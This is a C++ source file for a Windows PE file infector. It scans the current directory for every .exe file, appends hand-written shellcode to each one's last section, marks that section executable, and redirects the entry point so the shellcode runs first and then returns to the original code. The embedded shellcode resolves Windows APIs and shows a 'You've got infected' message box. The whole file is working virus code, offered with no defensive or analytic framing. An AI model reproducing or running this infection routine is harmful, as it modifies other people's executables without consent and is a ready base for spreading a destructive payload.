#include "PEfunc.cpp"

int msgBox() {
    return MessageBoxA(0, "You've got infected", "rekcusTQ", MB_OK);
}

int infect(const char* fName) {
    cout << fName << ": ";

    FILE * pFile = fopen(fName, "rb+"); // *.exe
    if(!pFile) {
        cout << "Could not open file!\n";
        return -1;
    }

    fseek(pFile , 0 , SEEK_END);
    size_t length = ftell(pFile);
    fseek(pFile, 0, SEEK_SET);

    char * buffer = new char [length];
    if(!fread(buffer, 1, length, pFile)) {
        if (!feof(pFile)) {
            cout << "Read file failed.\n";
        }
    }

    if(!getMagic(buffer))
        return -1;
    e_lfanew = toInt(getLfanew(buffer));

    if(!PESignature(buffer))
        return -1;

    initFileHeader(buffer);
    initOptionalHeader(buffer);
    initDataDirectory(buffer);
    int noSec = toInt(FileHeader.NumberOfSections);
    initSectionHeader(buffer, noSec);

    // 1. jump to end file and write opcode
    int rAddr = toInt(OptionalHeader.AddressOfEntryPoint) - 16*4;
    int endFile = toInt(SectionHeader[noSec-1].PointerToRawData) + toInt(SectionHeader[noSec-1].SizeOfRawData);

    int offset = e_lfanew + 40;
    char shellcode[] = "\x31\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD"
                       "\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x01\xDA\x8B\x52\x78"
                       "\x01\xDA\x8B\x72\x20\x01\xDE\x31\xC9\x8B\x53\x3C\x01"
                       "\xDA\x8B\x52\x78\x01\xDA\x8B\x72\x20\x01\xDE\x31\xC9"
                       "\x41\xAD\x01\xD8\x81\x38\x47\x65\x74\x50\x75\xF4\x81"
                       "\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64"
                       "\x72\x65\x75\xE2\x8B\x72\x24\x01\xDE\x66\x8B\x0C\x4E"
                       "\x49\x8B\x72\x1C\x01\xDE\x8B\x14\x8E\x01\xDA\x31\xC9"
                       "\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72"
                       "\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59"
                       "\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68"
                       "\x75\x73\x65\x72\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
                       "\x04\x31\xC9\x51\xB9\x6F\x78\x41\x61\x51\x83\x6C\x24"
                       "\x03\x61\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54"
                       "\x50\xFF\xD2\x83\xC4\x14\x31\xC9\x51\xB9\x74\x65\x64"
                       "\x61\x51\x83\x6C\x24\x03\x61\x68\x6E\x66\x65\x63\x68"
                       "\x6F\x74\x20\x69\x68\x76\x65\x20\x67\x68\x59\x6F\x75"
                       "\x27\x89\xE3\x31\xC9\x51\x68\x75\x73\x54\x51\x68\x72"
                       "\x65\x6B\x63\x89\xE1\x31\xD2\x52\x51\x53\x31\xFF\x57"
                       "\xFF\xD0";/*/
                       "\x31\xdb\xb3\x30\x29\xdc\x64\x8b\x03\x8b\x40\x0c\x8b"
                       "\x58\x1c\x8b\x1b\x8b\x1b\x8b\x73\x08\x89\xf7\x89\x3c"
                       "\x24\x8b\x47\x3c\x01\xc7\x31\xdb\xb3\x78\x01\xdf\x8b"
                       "\x3f\x8b\x04\x24\x01\xf8\x89\x44\x24\x08\x31\xdb\xb3"
                       "\x1c\x01\xc3\x8b\x03\x8b\x3c\x24\x01\xf8\x89\x44\x24"
                       "\x0c\x8b\x44\x24\x08\x31\xdb\xb3\x20\x01\xc3\x8b\x03"
                       "\x01\xf8\x89\x44\x24\x10\x8b\x44\x24\x08\x31\xdb\xb3"
                       "\x24\x01\xc3\x8b\x03\x01\xf8\x89\x44\x24\x14\x8b\x44"
                       "\x24\x08\x31\xdb\xb3\x18\x01\xc3\x8b\x03\x89\x44\x24"
                       "\x18\x8b\x74\x24\x30\x31\xf6\x89\x74\x24\x30\x8b\x4c"
                       "\x24\x18\x8b\x2c\x24\x8b\x5c\x24\x10\x8b\x4c\x24\x18"
                       "\x85\xc9\x74\x5f\x49\x89\x4c\x24\x18\x8b\x34\x8b\x01"
                       "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf"
                       "\x0d\x01\xc7\xeb\xf4\x8b\x5c\x24\x14\x66\x8b\x0c\x4b"
                       "\x8b\x5c\x24\x0c\x8b\x04\x8b\x01\xe8\x8b\x34\x24\x81"
                       "\xff\xaa\xfc\x0d\x7c\x75\x08\x8d\x74\x24\x20\x89\x06"
                       "\xeb\xb5\x81\xff\x8e\x4e\x0e\xec\x75\x08\x8d\x74\x24"
                       "\x24\x89\x06\xeb\xa5\x81\xff\x7e\xd8\xe2\x73\x75\x9d"
                       "\x8d\x74\x24\x1c\x89\x06\xeb\x95\x89\xe6\x31\xd2\x66"
                       "\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x75\x73\x65"
                       "\x72\x54\xff\x56\x24\x89\x46\x28\x31\xd2\xb2\x41\x52"
                       "\x31\xd2\x66\xba\x6f\x78\x66\x52\x68\x61\x67\x65\x42"
                       "\x68\x4d\x65\x73\x73\x54\x50\xff\x56\x20\x89\x46\x2c"
                       "\x31\xd2\xb2\x20\x52\x31\xd2\x66\xba\x74\x6f\x66\x52"
                       "\x68\x74\x65\x64\x00\x68\x6e\x66\x65\x63\x68\x6f\x74"
                       "\x20\x69\x68\x76\x65\x20\x67\x68\x59\x6f\x75\x27\x89"
                       "\xe3\x32\xd2\x52\x68\x75\x73\x54\x51\x68\x72\x65\x6b"
                       "\x63\x89\xe1\x31\xd2\xb2\x00\x52\x31\xd2\x51\x53\x31"
                       "\xff\x57\xff\x56\x2c";//*/
    char returnAddress[] = "\x68\x00\x00\x00\x00\xC3";
    returnAddress[1] = char(int(buffer[offset+0]) + int(buffer[offset+12]));
    returnAddress[2] = char(int(buffer[offset+1]) + int(buffer[offset+13]));
    returnAddress[3] = char(int(buffer[offset+2]) + int(buffer[offset+14]));
    returnAddress[4] = char(int(buffer[offset+3]) + int(buffer[offset+15]));
    int bufSize = sizeof(shellcode) - 1;
    // cout << bufSize << endl;
    fseek(pFile, endFile, SEEK_SET);
    fwrite(shellcode, 1, bufSize, pFile);
    fwrite(returnAddress, 1, sizeof(returnAddress)-1, pFile);
    
    offset = e_lfanew + 24 + toInt(FileHeader.SizeOfOptionalHeader) + (noSec - 1) * 40;
    // 2. add size of opcode to raw size
    bufSize += toInt(SectionHeader[noSec-1].SizeOfRawData);
    fseek(pFile, offset+16, SEEK_SET);
    fwrite(&bufSize, 4, 1, pFile);

    // 3. round up virtual size
    int secAlign = toInt(OptionalHeader.SectionAlignment);
    int virSize = toInt(SectionHeader[noSec-1].VirtualSize);
    if(virSize % secAlign)
        virSize = ((virSize / secAlign) + 1) * secAlign;
    fseek(pFile, offset+8, SEEK_SET);
    fwrite(&virSize, 4, 1, pFile);

    // 4. change section characteristic to execute
    int chrst = toInt(toHex(buffer[offset+39]));
    int sub = chrst % 16;
    chrst /= 16;
    if(chrst % 4 == 0 || chrst % 4 == 1)
        chrst += 2;
    chrst = chrst * 16 + sub;
    fseek(pFile, offset+39, SEEK_SET);
    fwrite(&chrst, 1, 1, pFile);

    // 5. get end file rva -> replace to AddressOfEntryPoint
    int aoep = offset2RVA(endFile, noSec);
    offset = e_lfanew + 40;
    fseek(pFile, offset, SEEK_SET);
    fwrite(&aoep, 4, 1, pFile);

    cout << "Done\n";
    fclose(pFile);
    delete[] buffer;
    return 0;
}

int main(int argc, const char** argv) {
    if(argc < 2)
        return -1;

    WIN32_FIND_DATA FindFile;
    HANDLE hFind;

    hFind = FindFirstFileA("*.exe", &FindFile);
    if (hFind == INVALID_HANDLE_VALUE) {
        cout << "No exe file found\n" << GetLastError() << endl;
        return 0;
    }
    do
        infect(FindFile.cFileName);
    while(FindNextFileA(hFind,&FindFile));
    // infect(argv[1]);

    FindClose(hFind);
    return 0;
}